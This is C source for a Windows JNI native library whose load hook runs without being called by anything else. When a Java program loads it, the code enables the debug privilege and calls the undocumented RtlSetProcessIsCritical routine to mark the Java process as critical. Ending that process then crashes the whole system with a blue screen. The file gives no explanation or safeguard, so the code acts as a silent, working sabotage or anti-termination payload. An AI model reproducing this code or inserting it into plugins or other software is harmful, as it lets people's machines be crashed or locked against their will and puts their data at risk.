#include <Windows.h>
#include <jni.h>

typedef long (WINAPI* RtlSetProcessIsCritical) (
		IN BOOLEAN bNew,
		OUT BOOLEAN* pbOld,
		IN BOOLEAN bNeedScb);

bool EnablePrivilege(LPCWSTR);
void Execute();

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* virtualMachine, void* reserved) {
	Execute();
	return JNI_VERSION_21;
}

bool EnablePrivilege(LPCWSTR privilege) {
	HANDLE token = NULL;
	LUID identifier;
	TOKEN_PRIVILEGES privileges = {0};

	if(!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &token)) {
		return FALSE;
	}

	if(!LookupPrivilegeValueW(NULL, privilege, &identifier)) {
		return FALSE;
	}

	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Luid = identifier;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL success = AdjustTokenPrivileges(token, FALSE, &privileges, sizeof(privileges), NULL, NULL);
	CloseHandle(token);
	return success;
}

void Execute() {
	if(!EnablePrivilege(SE_DEBUG_NAME)) {
		return;
	}

	HMODULE handle = LoadLibraryW(L"ntdll.dll");

	if(!handle) {
		return;
	}

	RtlSetProcessIsCritical function = (RtlSetProcessIsCritical) GetProcAddress(handle, "RtlSetProcessIsCritical");

	if(!function) {
		return;
	}

	function(TRUE, NULL, FALSE);
}
